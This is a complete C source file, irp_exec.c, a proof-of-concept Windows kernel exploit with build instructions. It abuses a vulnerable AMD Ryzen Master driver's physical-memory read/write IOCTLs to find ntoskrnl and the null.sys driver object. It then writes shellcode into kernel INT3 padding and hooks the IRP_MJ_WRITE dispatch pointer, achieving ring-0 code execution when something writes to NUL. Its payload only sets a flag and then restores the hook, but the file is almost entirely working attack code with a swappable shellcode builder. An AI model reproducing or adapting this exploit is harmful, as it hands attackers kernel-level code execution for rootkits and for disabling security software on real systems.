/*
 * irp_exec.c — IRP dispatch hook → ring-0 code execution via null.sys
 *
 * Technique:
 *   1. Find ntoskrnl base PA (disk fingerprint + physical scan)
 *   2. Find null.sys DriverObject via physical scan (Type=4, DriverName=\Driver\Null)
 *   3. Find CC-padding region in ntoskrnl .text (≥64 bytes of 0xCC INT3 nops)
 *   4. Find zero region in ntoskrnl .data for write-signal
 *   5. Build shellcode: write signal → jmp original_handler
 *   6. phys_write shellcode into CC region (kernel executable)
 *   7. phys_write shellcode_kva into DRIVER_OBJECT.MajorFunction[IRP_MJ_WRITE]
 *   8. Trigger: WriteFile to \\.\NUL → kernel calls our shellcode at ring-0
 *   9. Detect signal, restore handler, clear CC bytes
 *
 * This validates that physical writes can achieve ring-0 code execution via
 * the IRP dispatch path without SSDT, without sysdiag, without any other driver.
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -O2 -Wall -Wno-unused-function \
 *       -o irp_exec.exe irp_exec.c -lkernel32 -ladvapi32
 *
 * Requires: AMDRyzenMasterDriverV20, Admin rights.
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <inttypes.h>

/* ══════════════════════════════════════════════════════════════════════════
 * §1  AMD DRIVER PRIMITIVES
 * ══════════════════════════════════════════════════════════════════════════ */

#define DEVICE_NAME      L"\\\\.\\AMDRyzenMasterDriverV20"
#define IOCTL_PHYS_READ  0x81112F08u
#define IOCTL_PHYS_WRITE 0x81112F0Cu
static HANDLE g_dev = INVALID_HANDLE_VALUE;

#define MAX_RANGES 64
typedef struct { uint64_t base, size; } PhysRange;
static PhysRange g_ranges[MAX_RANGES];
static int       g_nranges = 0;

static void load_ranges(void)
{
    HKEY h;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
            0, KEY_READ, &h) != ERROR_SUCCESS) return;
    char vname[256]; DWORD vn, type;
    uint8_t *buf = NULL; DWORD sz = 0;
    for (DWORD i = 0;; i++) {
        vn = sizeof vname; DWORD vd = 0;
        LONG r = RegEnumValueA(h, i, vname, &vn, NULL, &type, NULL, &vd);
        if (r == ERROR_NO_MORE_ITEMS) break;
        if ((type != 3 && type != 8) || vd < 20) continue;
        buf = malloc(vd); if (!buf) continue;
        if (RegQueryValueExA(h, vname, NULL, NULL, buf, &vd) == ERROR_SUCCESS)
            { sz = vd; break; }
        free(buf); buf = NULL;
    }
    RegCloseKey(h);
    if (!buf || sz < 20) { free(buf); return; }
    DWORD cnt = *(DWORD*)(buf + 16); uint8_t *p = buf + 20;
    for (DWORD i = 0; i < cnt && g_nranges < MAX_RANGES; i++, p += 20) {
        g_ranges[g_nranges].base = *(uint64_t*)(p + 4);
        g_ranges[g_nranges].size = *(uint64_t*)(p + 12);
        g_nranges++;
    }
    free(buf);
}

static int in_range(uint64_t pa, uint32_t len)
{
    for (int i = 0; i < g_nranges; i++)
        if (pa >= g_ranges[i].base && pa + len <= g_ranges[i].base + g_ranges[i].size)
            return 1;
    return 0;
}
static int open_dev(void)
{
    g_dev = CreateFileW(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE,
                        FILE_SHARE_READ | FILE_SHARE_WRITE,
                        NULL, OPEN_EXISTING, 0, NULL);
    return g_dev != INVALID_HANDLE_VALUE;
}
static void close_dev(void) { if (g_dev != INVALID_HANDLE_VALUE) CloseHandle(g_dev); }

static int phys_read(uint64_t pa, void *buf, uint32_t len)
{
    if (!in_range(pa, len)) return 0;
    uint8_t ib[12]; *(uint64_t*)ib = pa; *(uint32_t*)(ib+8) = len;
    uint8_t ob[12 + 4096]; DWORD r = 0;
    if (!DeviceIoControl(g_dev, IOCTL_PHYS_READ, ib, 12, ob, 12+len, &r, NULL)) return 0;
    memcpy(buf, ob + 12, len); return 1;
}
static int phys_write(uint64_t pa, const void *buf, uint32_t len)
{
    if (!in_range(pa, len)) return 0;
    uint8_t *ib = malloc(12 + len); if (!ib) return 0;
    *(uint64_t*)ib = pa; *(uint32_t*)(ib+8) = len;
    memcpy(ib + 12, buf, len);
    DWORD r = 0;
    int ok = DeviceIoControl(g_dev, IOCTL_PHYS_WRITE, ib, 12+len, NULL, 0, &r, NULL);
    free(ib); return ok;
}
static uint64_t phys_read64(uint64_t pa) { uint64_t v=0; phys_read(pa,&v,8); return v; }
static uint32_t phys_read32(uint64_t pa) { uint32_t v=0; phys_read(pa,&v,4); return v; }
static uint16_t phys_read16(uint64_t pa) { uint16_t v=0; phys_read(pa,&v,2); return v; }
static uint8_t  phys_read8 (uint64_t pa) { uint8_t  v=0; phys_read(pa,&v,1); return v; }

/* ══════════════════════════════════════════════════════════════════════════
 * §2  KERNEL MODULE ENUMERATION
 * ══════════════════════════════════════════════════════════════════════════ */

typedef NTSTATUS (WINAPI *NtQSI_t)(ULONG, PVOID, ULONG, PULONG);
typedef struct {
    ULONG  NextEntryOffset;
    UCHAR  NumberOfModules;
    struct {
        PVOID  Section;
        PVOID  MappedBase;
        PVOID  ImageBase;
        ULONG  ImageSize;
        ULONG  Flags;
        USHORT LoadOrderIndex;
        USHORT InitOrderIndex;
        USHORT LoadCount;
        USHORT OffsetToFileName;
        CHAR   FullPathName[256];
    } Modules[1];
} SYSTEM_MODULE_INFORMATION;

static uint64_t g_ntoskrnl_va = 0;
static uint32_t g_ntoskrnl_size = 0;
static char     g_ntoskrnl_path[256] = {0};

static int load_kernel_modules(void)
{
    NtQSI_t NtQSI = (NtQSI_t)GetProcAddress(GetModuleHandleA("ntdll.dll"),
                                              "NtQuerySystemInformation");
    if (!NtQSI) return 0;
    ULONG sz = 0;
    NtQSI(11, NULL, 0, &sz);
    sz += 4096;
    BYTE *buf = malloc(sz); if (!buf) return 0;
    NTSTATUS st = NtQSI(11, buf, sz, &sz);
    if (st != 0) { free(buf); return 0; }
    SYSTEM_MODULE_INFORMATION *mi = (SYSTEM_MODULE_INFORMATION*)buf;
    for (UCHAR i = 0; i < mi->NumberOfModules; i++) {
        const char *fn = mi->Modules[i].FullPathName + mi->Modules[i].OffsetToFileName;
        if (_stricmp(fn, "ntoskrnl.exe") == 0 || _stricmp(fn, "ntkrnlmp.exe") == 0) {
            g_ntoskrnl_va   = (uint64_t)mi->Modules[i].ImageBase;
            g_ntoskrnl_size = mi->Modules[i].ImageSize;
            strncpy(g_ntoskrnl_path, mi->Modules[i].FullPathName, 255);
            /* Replace leading \SystemRoot with actual path */
            if (_strnicmp(g_ntoskrnl_path, "\\SystemRoot\\", 12) == 0) {
                char tmp[256]; GetSystemDirectoryA(tmp, sizeof tmp);
                memmove(g_ntoskrnl_path + strlen(tmp),
                        g_ntoskrnl_path + 11,
                        strlen(g_ntoskrnl_path) - 10);
                memcpy(g_ntoskrnl_path, tmp, strlen(tmp));
            }
            free(buf); return 1;
        }
    }
    free(buf); return 0;
}

/* ══════════════════════════════════════════════════════════════════════════
 * §3  NTOSKRNL PHYSICAL BASE FINDER (disk-fingerprint approach)
 * ══════════════════════════════════════════════════════════════════════════ */

static uint64_t g_ntoskrnl_pa = 0;

static int find_ntoskrnl_pa(void)
{
    /* Read first 64 bytes of ntoskrnl from disk as fingerprint */
    HANDLE hf = CreateFileA(g_ntoskrnl_path, GENERIC_READ, FILE_SHARE_READ,
                            NULL, OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE) {
        printf("[!] Cannot open %s: %lu\n", g_ntoskrnl_path, GetLastError());
        return 0;
    }
    uint8_t fp[64] = {0};
    DWORD rd = 0; ReadFile(hf, fp, 64, &rd, NULL);
    CloseHandle(hf);
    if (rd < 64) return 0;

    /* Scan 2MB-aligned PAs for matching fingerprint */
    for (int r = 0; r < g_nranges; r++) {
        uint64_t base = (g_ranges[r].base + 0x1FFFFF) & ~0x1FFFFFULL;
        uint64_t end  = g_ranges[r].base + g_ranges[r].size;
        for (uint64_t pa = base; pa + g_ntoskrnl_size < end; pa += 0x200000) {
            uint8_t buf[64];
            if (!phys_read(pa, buf, 64)) continue;
            if (memcmp(buf, fp, 64) == 0) { g_ntoskrnl_pa = pa; return 1; }
        }
    }
    return 0;
}

/* ══════════════════════════════════════════════════════════════════════════
 * §4  PE SECTION SCANNER
 * ══════════════════════════════════════════════════════════════════════════ */

typedef struct {
    uint64_t rva_start;
    uint64_t rva_end;
    uint32_t characteristics;
} Section;

#define MAX_SECS 32
static Section g_secs[MAX_SECS];
static int     g_nsecs = 0;

static void load_pe_sections(void)
{
    uint8_t hdrbuf[4096]; g_nsecs = 0;
    if (!phys_read(g_ntoskrnl_pa, hdrbuf, 4096)) return;
    uint32_t pe_off = *(uint32_t*)(hdrbuf + 0x3C);
    if (pe_off + 0x108 > 4096) return;
    uint8_t *pe = hdrbuf + pe_off;
    if (*(uint32_t*)pe != 0x00004550) return;
    uint16_t nsec = *(uint16_t*)(pe + 6);
    uint16_t opt_sz = *(uint16_t*)(pe + 20);
    uint8_t *sec = pe + 24 + opt_sz;
    for (int i = 0; i < nsec && g_nsecs < MAX_SECS; i++, sec += 40) {
        g_secs[g_nsecs].rva_start      = *(uint32_t*)(sec + 12);
        g_secs[g_nsecs].rva_end        = g_secs[g_nsecs].rva_start + *(uint32_t*)(sec + 16);
        g_secs[g_nsecs].characteristics = *(uint32_t*)(sec + 36);
        g_nsecs++;
    }
}

/* Find ≥min_len consecutive 0xCC bytes in ntoskrnl executable sections */
static uint64_t find_cc_region(int min_len, int *found_len)
{
    for (int s = 0; s < g_nsecs; s++) {
        if (!(g_secs[s].characteristics & 0x20000000)) continue; /* not executable */
        uint64_t rva = g_secs[s].rva_start;
        uint64_t end = g_secs[s].rva_end;
        int run = 0; uint64_t run_start = 0;
        for (uint64_t off = rva; off < end; off++) {
            uint8_t b = phys_read8(g_ntoskrnl_pa + off);
            if (b == 0xCC) {
                if (run == 0) run_start = off;
                run++;
                if (run >= min_len) {
                    if (found_len) *found_len = run;
                    return run_start; /* rva of CC run start */
                }
            } else { run = 0; }
        }
    }
    return 0;
}

/* Find ≥min_len zero bytes in ntoskrnl .data (writable, not executable) */
static uint64_t find_data_zero_region(int min_len)
{
    for (int s = 0; s < g_nsecs; s++) {
        uint32_t ch = g_secs[s].characteristics;
        /* Writable and NOT executable */
        if (!(ch & 0x80000000)) continue;
        if (ch & 0x20000000) continue;
        uint64_t rva = g_secs[s].rva_start;
        uint64_t end = g_secs[s].rva_end;
        int run = 0; uint64_t run_start = 0;
        for (uint64_t off = rva; off < end; off++) {
            if (phys_read8(g_ntoskrnl_pa + off) == 0) {
                if (run == 0) run_start = off;
                run++;
                if (run >= min_len) return run_start;
            } else { run = 0; }
        }
    }
    return 0;
}

/* ══════════════════════════════════════════════════════════════════════════
 * §5  PAGE TABLE WALK + SYSTEM EPROCESS SCAN
 * ══════════════════════════════════════════════════════════════════════════ */

static uint64_t g_kernel_cr3 = 0;

static uint64_t kva_to_pa(uint64_t va)
{
    if (!g_kernel_cr3) return 0;
    uint64_t pml4e = phys_read64((g_kernel_cr3 & ~0xFFFULL) + ((va >> 39) & 0x1FF) * 8);
    if (!(pml4e & 1)) return 0;
    uint64_t pdpte = phys_read64((pml4e & 0x000FFFFFFFFFF000ULL) + ((va >> 30) & 0x1FF) * 8);
    if (!(pdpte & 1)) return 0;
    if (pdpte & (1ULL << 7)) return (pdpte & 0x000FFFFFC0000000ULL) | (va & 0x3FFFFFFF);
    uint64_t pde = phys_read64((pdpte & 0x000FFFFFFFFFF000ULL) + ((va >> 21) & 0x1FF) * 8);
    if (!(pde & 1)) return 0;
    if (pde & (1ULL << 7)) return (pde & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFF);
    uint64_t pte = phys_read64((pde & 0x000FFFFFFFFFF000ULL) + ((va >> 12) & 0x1FF) * 8);
    if (!(pte & 1)) return 0;
    return (pte & 0x000FFFFFFFFFF000ULL) | (va & 0xFFF);
}

static int find_kernel_cr3(void)
{
    /* Scan for System EPROCESS (ImageFileName="System", PID=4, DTB page-aligned) */
    for (int r = 0; r < g_nranges; r++) {
        uint64_t base = g_ranges[r].base, end = base + g_ranges[r].size;
        for (uint64_t pa = base; pa + 0x900 < end; pa += 0x10) {
            char nm[16]; if (!phys_read(pa + 0x5A8, nm, 8)) continue;
            if (memcmp(nm, "System\0\0", 8) != 0) continue;
            uint64_t pid = phys_read64(pa + 0x440);
            if (pid != 4) continue;
            uint64_t dtb = phys_read64(pa + 0x028);
            if (!dtb || (dtb & 0xFFF)) continue;
            g_kernel_cr3 = dtb;
            return 1;
        }
    }
    return 0;
}

/* ══════════════════════════════════════════════════════════════════════════
 * §6  NULL.SYS DRIVEROBJECT FINDER
 *
 * DRIVER_OBJECT layout (x64):
 *   +0x00  SHORT  Type   = 4
 *   +0x02  SHORT  Size   = 0xA8
 *   +0x08  PVOID  DeviceObject
 *   +0x18  PVOID  DriverStart
 *   +0x20  ULONG  DriverSize
 *   +0x38  UNICODE_STRING DriverName { Length(2), MaxLength(2), pad(4), Buffer*(8) }
 *   +0x70  PVOID  MajorFunction[28]
 * ══════════════════════════════════════════════════════════════════════════ */

#define IRP_MJ_WRITE 4
#define DRVOBJ_TYPE_OFF    0x00
#define DRVOBJ_SIZE_OFF    0x02
#define DRVOBJ_DRVNAME_OFF 0x38 /* UNICODE_STRING */
#define DRVOBJ_MAJFN_OFF   0x70

static uint64_t find_null_drv_obj_pa(void)
{
    /* Unicode string "\Driver\Null" = 12 chars = 24 bytes */
    static const uint8_t null_name[] = {
        '\\',0,'D',0,'r',0,'i',0,'v',0,'e',0,'r',0,
        '\\',0,'N',0,'u',0,'l',0,'l',0
    };

    for (int r = 0; r < g_nranges; r++) {
        uint64_t base = g_ranges[r].base, end = base + g_ranges[r].size;
        for (uint64_t pa = base + 0x100; pa + 0xB0 < end; pa += 0x10) {
            /* Quick filter: Type=4, Size=0xA8 */
            if (phys_read16(pa + DRVOBJ_TYPE_OFF) != 4) continue;
            if (phys_read16(pa + DRVOBJ_SIZE_OFF) != 0xA8) continue;

            /* Read DriverName UNICODE_STRING:
             * DriverName.Length at +0x38 (USHORT)
             * DriverName.Buffer at +0x40 (PVOID, x64) — but struct may pack differently
             * On x64: UNICODE_STRING = { USHORT(2), USHORT(2), 4-byte pad, PVOID(8) } = 16B
             * So: +0x38=Length, +0x3A=MaxLength, +0x3C=pad, +0x40=Buffer
             */
            uint16_t ulen = phys_read16(pa + DRVOBJ_DRVNAME_OFF);
            if (ulen != sizeof(null_name)) continue; /* 24 bytes for \Driver\Null */
            uint64_t ubuf_kva = phys_read64(pa + DRVOBJ_DRVNAME_OFF + 8);
            if (!ubuf_kva) continue;

            /* Convert buffer KVA to PA */
            uint64_t ubuf_pa = kva_to_pa(ubuf_kva);
            if (!ubuf_pa) continue;

            /* Read and compare */
            uint8_t name_buf[24] = {0};
            if (!phys_read(ubuf_pa, name_buf, 24)) continue;
            if (memcmp(name_buf, null_name, 24) == 0) {
                printf("[+] null.sys DriverObject found at PA: %016" PRIx64 "\n", pa);
                return pa;
            }
        }
    }
    return 0;
}

/* ══════════════════════════════════════════════════════════════════════════
 * §7  SHELLCODE BUILDER
 *
 * Prototype: NTSTATUS WriteDispatch(PDEVICE_OBJECT DevObj, PIRP Irp)
 * RCX = DevObj, RDX = Irp  — standard x64 ABI
 *
 * Shellcode:
 *   push rcx / push rdx          ; save args
 *   mov rcx, signal_va           ; signal KVA (ntoskrnl .data)
 *   mov dword [rcx], 1           ; flag = 1
 *   pop rdx / pop rcx            ; restore args
 *   mov rax, orig_handler_va     ; original null.sys handler KVA
 *   jmp rax
 * ══════════════════════════════════════════════════════════════════════════ */

static int build_shellcode(uint8_t *sc, uint64_t signal_kva, uint64_t orig_kva)
{
    int i = 0;
    sc[i++] = 0x51;                         /* push rcx */
    sc[i++] = 0x52;                         /* push rdx */
    /* mov rcx, signal_kva (10 bytes) */
    sc[i++] = 0x48; sc[i++] = 0xB9;
    memcpy(&sc[i], &signal_kva, 8); i += 8;
    /* mov dword ptr [rcx], 1 (7 bytes) */
    sc[i++] = 0xC7; sc[i++] = 0x01;
    sc[i++] = 0x01; sc[i++] = 0x00; sc[i++] = 0x00; sc[i++] = 0x00;
    sc[i++] = 0x5A;                         /* pop rdx */
    sc[i++] = 0x59;                         /* pop rcx */
    /* mov rax, orig_kva (10 bytes) */
    sc[i++] = 0x48; sc[i++] = 0xB8;
    memcpy(&sc[i], &orig_kva, 8); i += 8;
    sc[i++] = 0xFF; sc[i++] = 0xE0;         /* jmp rax */
    return i; /* total bytes */
}

/* ══════════════════════════════════════════════════════════════════════════
 * §8  MAIN
 * ══════════════════════════════════════════════════════════════════════════ */

int main(void)
{
    puts("=== irp_exec: ring-0 code execution via IRP dispatch hook ===");

    if (!open_dev()) { fputs("[-] Cannot open AMD device\n", stderr); return 1; }
    load_ranges();
    if (!g_nranges) { puts("[-] No physical ranges"); close_dev(); return 1; }

    /* Find ntoskrnl */
    if (!load_kernel_modules()) { puts("[-] NtQuerySystemInformation failed"); close_dev(); return 1; }
    printf("[+] ntoskrnl VA: %016" PRIx64 " size: 0x%X\n", g_ntoskrnl_va, g_ntoskrnl_size);
    printf("[+] ntoskrnl path: %s\n", g_ntoskrnl_path);

    if (!find_ntoskrnl_pa()) { puts("[-] ntoskrnl PA not found"); close_dev(); return 1; }
    printf("[+] ntoskrnl PA: %016" PRIx64 "\n", g_ntoskrnl_pa);

    load_pe_sections();
    printf("[+] PE sections loaded: %d\n", g_nsecs);

    /* Kernel CR3 for KVA→PA */
    if (!find_kernel_cr3()) { puts("[-] Kernel CR3 not found"); close_dev(); return 1; }
    printf("[+] Kernel CR3: %016" PRIx64 "\n", g_kernel_cr3);

    /* Find CC region for shellcode placement */
    int cc_len = 0;
    uint64_t cc_rva = find_cc_region(48, &cc_len);
    if (!cc_rva) { puts("[-] CC region not found in ntoskrnl .text"); close_dev(); return 1; }
    uint64_t cc_pa  = g_ntoskrnl_pa + cc_rva;
    uint64_t cc_kva = g_ntoskrnl_va + cc_rva;
    printf("[+] CC region: RVA 0x%" PRIx64 " len %d, KVA %016" PRIx64 "\n",
           cc_rva, cc_len, cc_kva);

    /* Find .data zero region for signal */
    uint64_t sig_rva = find_data_zero_region(8);
    if (!sig_rva) { puts("[-] .data zero region not found"); close_dev(); return 1; }
    uint64_t sig_pa  = g_ntoskrnl_pa + sig_rva;
    uint64_t sig_kva = g_ntoskrnl_va + sig_rva;
    printf("[+] Signal region: RVA 0x%" PRIx64 ", KVA %016" PRIx64 "\n", sig_rva, sig_kva);

    /* Find null.sys DriverObject */
    uint64_t drv_pa = find_null_drv_obj_pa();
    if (!drv_pa) { puts("[-] null.sys DriverObject not found"); close_dev(); return 1; }

    /* Read original MajorFunction[IRP_MJ_WRITE] */
    uint64_t mj_pa   = drv_pa + DRVOBJ_MAJFN_OFF + (uint64_t)IRP_MJ_WRITE * 8;
    uint64_t orig_kva = phys_read64(mj_pa);
    printf("[+] MajorFunction[IRP_MJ_WRITE] PA: %016" PRIx64 " KVA: %016" PRIx64 "\n",
           mj_pa, orig_kva);

    /* Build shellcode */
    uint8_t sc[48]; int sc_len = build_shellcode(sc, sig_kva, orig_kva);
    printf("[+] Shellcode: %d bytes, placed at KVA %016" PRIx64 "\n", sc_len, cc_kva);

    /* Save original CC bytes for restoration */
    uint8_t cc_orig[48]; phys_read(cc_pa, cc_orig, sc_len);

    /* Clear signal */
    uint64_t zero8 = 0; phys_write(sig_pa, &zero8, 8);

    /* Write shellcode to CC region */
    if (!phys_write(cc_pa, sc, sc_len)) {
        puts("[-] phys_write shellcode failed"); close_dev(); return 1;
    }

    /* Hook MajorFunction[IRP_MJ_WRITE] */
    if (!phys_write(mj_pa, &cc_kva, 8)) {
        puts("[-] phys_write hook failed"); close_dev(); return 1;
    }
    printf("[+] Hook installed: MajorFunction[4] → %016" PRIx64 "\n", cc_kva);

    /* Trigger: WriteFile to \\.\NUL */
    puts("[*] Triggering via WriteFile to \\\\.\\NUL ...");
    HANDLE hnul = CreateFileA("\\\\.\\NUL", GENERIC_WRITE,
                              FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hnul == INVALID_HANDLE_VALUE) {
        printf("[-] CreateFile(\\\\.\\NUL) failed: %lu\n", GetLastError());
    } else {
        DWORD wr = 0;
        WriteFile(hnul, "irp_exec trigger", 16, &wr, NULL);
        CloseHandle(hnul);
    }

    /* Wait for signal */
    Sleep(100);
    uint32_t sig_val = 0; phys_read(sig_pa, &sig_val, 4);
    printf("[%s] Signal: %u\n", sig_val ? "+" : "!", sig_val);

    /* Restore original handler */
    phys_write(mj_pa, &orig_kva, 8);
    /* Clear shellcode (restore CC bytes) */
    phys_write(cc_pa, cc_orig, sc_len);
    /* Clear signal region */
    uint64_t z = 0; phys_write(sig_pa, &z, 8);

    puts("[+] Hook restored, CC bytes cleared");

    if (sig_val) {
        puts("[+] SUCCESS: ring-0 shellcode executed via IRP dispatch hook");
    } else {
        puts("[-] Signal not set — IRP trigger may have been intercepted or hook missed");
        close_dev(); return 1;
    }

    close_dev();
    return 0;
}
